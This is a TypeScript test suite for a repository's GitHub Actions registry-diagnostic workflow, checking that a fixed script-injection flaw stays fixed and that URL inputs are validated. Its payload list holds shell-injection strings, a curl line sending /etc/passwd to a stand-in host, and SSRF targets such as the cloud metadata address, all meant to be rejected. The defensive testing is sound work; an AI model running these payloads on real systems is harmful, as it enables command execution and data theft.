import { test } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFile } from "node:child_process";

import {
  DEFAULT_TARGETS,
  EX_USAGE,
  MAX_URLS,
  REGISTRY_HOSTS,
  parseDiagnosticInput,
} from "../scripts/lib/diagnostic-input.mjs";
import { BREEDS } from "../src/lib/pet-intelligence/index.ts";

/**
 * The diagnostic's input was source code.
 *
 *     run: node scripts/diagnose-registry-response.mjs ${{ inputs.urls }}
 *
 * GitHub substitutes `${{ }}` into the script text BEFORE bash parses it, so a
 * dispatch input was never an argument. Anyone able to run the workflow could
 * execute commands on the runner with the job's token in scope, and `; whoami`
 * needed no quoting cleverness at all.
 *
 * These tests hold two lines. The first is structural: no workflow may put an
 * expression in command position again, whoever writes it. The second is
 * behavioural: hostile strings reaching the script are rejected as data, with
 * nothing fetched — proved by running the real script and checking that the
 * file its payload asks for does not exist.
 *
 * No malicious payload is ever executed against GitHub Actions. Every
 * adversarial case runs locally, and every one of them is expected to be inert.
 */

const REPO_ROOT = path.resolve(import.meta.dirname, "..");
const WORKFLOW_DIR = path.join(REPO_ROOT, ".github/workflows");
const workflows = fs.readdirSync(WORKFLOW_DIR).filter((f) => f.endsWith(".yml"));

/**
 * Every line that is part of a `run:` command, with its file and line number.
 *
 * YAML comments OUTSIDE a run block are skipped: an expression there is inert
 * documentation. A `#` INSIDE a run block is not skipped, because it is shell
 * text — and an expression whose value contains a newline escapes the comment
 * and executes on the next line.
 */
function runCommandLines(source: string): Array<{ line: number; text: string }> {
  const out: Array<{ line: number; text: string }> = [];
  const lines = source.split("\n");
  let inRun = false;
  let runIndent = 0;

  lines.forEach((line, i) => {
    const stripped = line.trim();
    const indent = line.length - line.trimStart().length;

    if (inRun) {
      if (stripped && indent <= runIndent) {
        inRun = false;
      } else {
        if (stripped) out.push({ line: i + 1, text: line });
        return;
      }
    }
    if (!stripped || stripped.startsWith("#")) return;

    const m = /^(\s*)(?:-\s+)?run:\s*(.*)$/.exec(line);
    if (!m) return;
    const isListItem = /^\s*-\s+run:/.test(line);
    runIndent = m[1].length + (isListItem ? 2 : 0);
    const rest = m[2].trim();
    if (["|", ">", "|-", ">-", "|+", ">+"].includes(rest)) {
      inRun = true;
    } else if (rest) {
      out.push({ line: i + 1, text: line });
    }
  });

  return out;
}

/* ================================================================ *
 * Phase 0.1 — the structural guard
 * ================================================================ */

test("no workflow puts a ${{ }} expression inside a run: command", () => {
  const offences: string[] = [];
  for (const file of workflows) {
    const source = fs.readFileSync(path.join(WORKFLOW_DIR, file), "utf8");
    for (const { line, text } of runCommandLines(source)) {
      if (text.includes("${{")) offences.push(`${file}:${line}  ${text.trim().slice(0, 80)}`);
    }
  }
  /*
   * An absolute rule with no allowlist, deliberately. "This particular
   * expression is a fixed literal we write ourselves" is a judgement that has
   * to be re-made correctly by every future reader; "none, ever" does not.
   * Pass values through `env:` — the runner hands those to the process verbatim
   * and never parses them.
   */
  assert.deepEqual(offences, [], `expressions in command position:\n${offences.join("\n")}`);
});

test("the scanner would catch the exact line that was removed", () => {
  // A negative control on the guard itself: a guard that cannot fail is not a
  // guard. This is the pre-fix step, verbatim.
  const regression = [
    "jobs:",
    "  describe:",
    "    steps:",
    "      - name: Describe registry responses",
    "        run: node scripts/diagnose-registry-response.mjs ${{ inputs.urls }}",
  ].join("\n");
  const found = runCommandLines(regression).filter((l) => l.text.includes("${{"));
  assert.equal(found.length, 1, "the scanner must flag the original injection");
  assert.equal(found[0].line, 5);
});

test("the scanner reads block scalars, and ignores YAML comments outside them", () => {
  const source = [
    "steps:",
    "  # ${{ inputs.urls }} in a comment is inert documentation",
    "  - name: safe",
    "    env:",
    "      X: ${{ inputs.urls }}",
    "    run: node script.mjs",
    "  - name: unsafe",
    "    run: |",
    "      echo start",
    "      # ${{ inputs.urls }}",
    "  - name: after",
    "    uses: actions/checkout@v4",
  ].join("\n");
  const flagged = runCommandLines(source).filter((l) => l.text.includes("${{"));
  assert.equal(flagged.length, 1, "only the one inside the block scalar");
  assert.equal(flagged[0].line, 10, "a # inside run: is shell text, not a YAML comment");
});

/* ================================================================ *
 * Phase 2 — dispatch-only
 * ================================================================ */

test("the diagnostic is dispatch-only and carries its guard rails", () => {
  const source = fs.readFileSync(path.join(WORKFLOW_DIR, "registry-diagnostic.yml"), "utf8");
  // Comments discuss the removed trigger by name, so compare against the data.
  const withoutComments = source
    .split("\n")
    .filter((l) => !l.trim().startsWith("#"))
    .join("\n");

  assert.match(withoutComments, /workflow_dispatch:/);
  assert.ok(!/^\s*pull_request:/m.test(withoutComments), "pull_request trigger must be gone");
  assert.ok(
    !/pull_request_target/.test(withoutComments),
    "pull_request_target runs with a writable token against the base repo",
  );
  assert.ok(!/^\s*schedule:/m.test(withoutComments), "a diagnostic must not run on a timer");
  assert.match(withoutComments, /permissions:\s*\n\s*contents: read/);
  assert.match(withoutComments, /timeout-minutes:/);
  assert.match(withoutComments, /concurrency:/);
});

test("the workflow passes input only through env", () => {
  const source = fs.readFileSync(path.join(WORKFLOW_DIR, "registry-diagnostic.yml"), "utf8");
  const withoutComments = source
    .split("\n")
    .filter((l) => !l.trim().startsWith("#"))
    .join("\n");
  assert.match(withoutComments, /FAUNAHUB_DIAGNOSTIC_URLS: \$\{\{ inputs\.urls \}\}/);
  assert.match(withoutComments, /FAUNAHUB_DIAGNOSTIC_MODE: \$\{\{ inputs\.mode \}\}/);
  // One step, therefore one fetch pass.
  assert.equal(
    (withoutComments.match(/run: node scripts\/diagnose-registry-response\.mjs/g) ?? []).length,
    1,
    "the script must be invoked once per run",
  );
});

/* ================================================================ *
 * Phase 1 / 4 — the input boundary
 * ================================================================ */

const reject = (env: Record<string, string>, argv: string[] = []) => {
  const r = parseDiagnosticInput({ argv, env });
  assert.equal(r.ok, false, `expected rejection for ${JSON.stringify({ env, argv })}`);
  return (r as { ok: false; errors: string[] }).errors.join(" | ");
};

test("blank input is a targeted run against the four defaults", () => {
  const r = parseDiagnosticInput({ argv: [], env: {} });
  assert.equal(r.ok, true);
  assert.equal((r as any).mode, "targeted");
  assert.deepEqual((r as any).urls, []);
  assert.equal(DEFAULT_TARGETS.length, 4, "targeted is exactly four requests");
});

test("approved explicit registry URLs are accepted", () => {
  const r = parseDiagnosticInput({
    argv: [],
    env: { FAUNAHUB_DIAGNOSTIC_URLS: "https://cfa.org/breed/korat/ https://www.akc.org/dog-breeds/beagle/" },
  });
  assert.equal(r.ok, true);
  assert.equal((r as any).urls.length, 2);
});

test("only https is allowed", () => {
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "http://cfa.org/breed/korat/" }), /only https/);
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "file:///etc/passwd" }), /only https/);
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "ftp://cfa.org/x" }), /only https/);
});

test("a host that is not a supported registry is refused", () => {
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://evil.example.com/collect" }),
    /not a supported registry/,
  );
  // The classic near-miss: a suffix that only looks like the real host.
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://cfa.org.evil.example.com/" }),
    /not a supported registry/,
  );
  // And the internal targets an SSRF would reach for.
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://127.0.0.1/" }), /not a supported registry/);
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://169.254.169.254/latest/meta-data/" }),
    /not a supported registry/,
  );
});

test("embedded credentials are refused", () => {
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://user:secret@cfa.org/breed/korat/" }),
    /embedded credentials/,
  );
  // Reads as cfa.org to a person; the real host is the one after the @.
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://cfa.org@evil.example.com/" }),
    /embedded credentials|not a supported registry/,
  );
});

test("malformed input is refused rather than guessed at", () => {
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "not-a-url" }), /not a valid URL/);
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "https://" }), /not a valid URL/);
});

test("leading option syntax cannot smuggle a flag through the URL list", () => {
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "--sweep" }), /looks like an option/);
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: "-rf" }), /looks like an option/);
});

test("unknown CLI options are refused", () => {
  assert.match(reject({}, ["--exfiltrate"]), /unknown option/);
  assert.match(reject({}, ["--delay=abc"]), /--delay= must be a number/);
  assert.match(reject({}, ["--delay=999999"]), /--delay= must be a number/);
});

test("the URL ceiling stops a mistyped dispatch becoming a crawl", () => {
  const many = Array.from({ length: MAX_URLS + 1 }, (_, i) => `https://cfa.org/breed/x${i}/`).join(" ");
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_URLS: many }), /at most 10 URLs/);
});

test("duplicates are fetched once", () => {
  const r = parseDiagnosticInput({
    argv: [],
    env: {
      FAUNAHUB_DIAGNOSTIC_URLS:
        "https://cfa.org/breed/korat/ https://cfa.org/breed/korat/ https://cfa.org/breed/manx/",
    },
  });
  assert.equal(r.ok, true);
  assert.equal((r as any).urls.length, 2, "describing a page twice costs a request and answers nothing");
});

test("sweep and explicit URLs are mutually exclusive", () => {
  assert.match(
    reject({ FAUNAHUB_DIAGNOSTIC_MODE: "sweep", FAUNAHUB_DIAGNOSTIC_URLS: "https://cfa.org/breed/korat/" }),
    /mutually exclusive/,
  );
});

test("an unknown mode is refused", () => {
  assert.match(reject({ FAUNAHUB_DIAGNOSTIC_MODE: "everything" }), /mode must be targeted or sweep/);
});

test("one bad URL rejects the whole run, not just itself", () => {
  const errors = reject({
    FAUNAHUB_DIAGNOSTIC_URLS: "https://cfa.org/breed/korat/ https://evil.example.com/",
  });
  assert.match(errors, /not a supported registry/);
  // Silently dropping it would answer a different question from the one asked,
  // and the answer would look exactly like the one that was asked for.
});

test("the allowlist is exactly the hosts the corpus cites", () => {
  const cited = new Set(
    BREEDS.flatMap((b) =>
      b.recognition.filter((r) => r.registryUrl).map((r) => new URL(r.registryUrl!).hostname),
    ),
  );
  for (const host of cited) {
    assert.ok(REGISTRY_HOSTS.includes(host), `${host} is cited by the corpus but not allowlisted`);
  }
});

/* ================================================================ *
 * Phase 0.2/0.3 — hostile strings, through the real script
 * ================================================================ */

/** Run the real script and report what it did. Never reaches the network. */
async function runScript(env: Record<string, string>, argv: string[] = []) {
  return new Promise<{ code: number | null; stdout: string; stderr: string }>((resolve) => {
    const child = execFile(
      "node",
      ["scripts/diagnose-registry-response.mjs", ...argv],
      { cwd: REPO_ROOT, maxBuffer: 16 * 1024 * 1024, env: { ...process.env, ...env } },
      (_e, stdout, stderr) => resolve({ code: child.exitCode, stdout, stderr }),
    );
  });
}

test("shell metacharacters are inert, and nothing is fetched", async () => {
  const canary = path.join(os.tmpdir(), `faunahub-injection-canary-${process.pid}`);
  fs.rmSync(canary, { force: true });

  /*
   * Each of these was a working command under `run: node script.mjs ${{ ... }}`.
   * There is no shell now, so each arrives as one string that is not a URL.
   */
  const payloads = [
    `; touch ${canary}`,
    `&& touch ${canary}`,
    `| touch ${canary}`,
    `$(touch ${canary})`,
    "`touch " + canary + "`",
    `"; touch ${canary}; echo "`,
    `'; touch ${canary}; echo '`,
    `https://cfa.org/breed/korat/\ntouch ${canary}`,
    `https://cfa.org/breed/korat/ && curl -d @/etc/passwd https://evil.example.com`,
    `$(cat /etc/passwd)`,
    `--delay=0 ; touch ${canary}`,
  ];

  for (const payload of payloads) {
    const r = await runScript({ FAUNAHUB_DIAGNOSTIC_URLS: payload });
    assert.equal(r.code, EX_USAGE, `payload was not rejected with EX_USAGE: ${JSON.stringify(payload)}`);
    assert.match(r.stderr, /nothing was fetched/, "the refusal must say nothing was fetched");
    assert.equal(r.stdout.trim(), "", "a rejected run must produce no diagnostic output");
    assert.ok(
      !fs.existsSync(canary),
      `the payload executed — ${canary} exists after ${JSON.stringify(payload)}`,
    );
  }

  assert.ok(!fs.existsSync(canary), "no payload created a file");
});

test("a rejected run cannot redirect diagnostics to another host", async () => {
  const r = await runScript({
    FAUNAHUB_DIAGNOSTIC_URLS: "https://attacker.example.net/collect?x=1",
  });
  assert.equal(r.code, EX_USAGE);
  assert.match(r.stderr, /not a supported registry/);
  assert.equal(r.stdout.trim(), "");
});

test("EX_USAGE is 64, and never collides with a verdict exit code", () => {
  // 0 CLEAN, 1 DISAGREEMENT, 2 DEGRADED — a usage error must not read as any.
  assert.equal(EX_USAGE, 64);
  assert.ok(![0, 1, 2].includes(EX_USAGE));
});

/* ================================================================ *
 * Phase 3 — request cardinality
 * ================================================================ */

const CFA_URL_COUNT = BREEDS.flatMap((b) =>
  b.recognition.filter((r) => r.registryId === "cfa" && r.registryUrl),
).length;

test("targeted is four requests and sweep is every CFA URL", () => {
  assert.equal(DEFAULT_TARGETS.length, 4);
  assert.equal(CFA_URL_COUNT, 45);
  assert.equal(new Set(DEFAULT_TARGETS).size, 4, "the defaults do not fetch a page twice");
});

test("there is exactly one fetch site, so a rendering cannot add traffic", () => {
  const source = fs.readFileSync(
    path.join(REPO_ROOT, "scripts/diagnose-registry-response.mjs"),
    "utf8",
  );
  assert.equal(
    (source.match(/await fetchPage\(/g) ?? []).length,
    1,
    "more than one fetch site means the request count depends on which ran",
  );

  /*
   * Both renderings must read the collected set. The previous workflow invoked
   * the script twice — once for people, once for JSON — and swept on top, so a
   * blank dispatch made 53 requests while its comment said four.
   */
  const fetchLoopAt = source.indexOf("await fetchPage(");
  assert.ok(source.indexOf("function renderHuman") > fetchLoopAt, "renderHuman runs after fetching");
  assert.ok(source.indexOf("const renderJson") > fetchLoopAt, "renderJson runs after fetching");
  for (const fn of ["renderHuman", "renderJson"]) {
    const body = source.slice(source.indexOf(fn));
    assert.match(body.slice(0, 2000), /results/, `${fn} must render from the collected results`);
  }
});

test("no test imports the script itself, because loading it fetches", () => {
  /*
   * The script has top-level await and makes requests as it loads, so
   * `import { DEFAULT_TARGETS } from ".../diagnose-registry-response.mjs"` —
   * which is exactly how this file was first written — made four live requests
   * every time the suite ran, silently and on every contributor's machine.
   *
   * The constant moved to diagnostic-input.mjs, which does nothing when loaded.
   */
  const dir = path.join(REPO_ROOT, "tests");
  for (const file of fs.readdirSync(dir).filter((f) => f.endsWith(".ts"))) {
    const source = fs.readFileSync(path.join(dir, file), "utf8");
    assert.ok(
      !/^import[^;]*from\s+["'][^"']*diagnose-registry-response\.mjs["']/m.test(source),
      `${file} imports the diagnostic script; loading it performs network requests`,
    );
  }
});
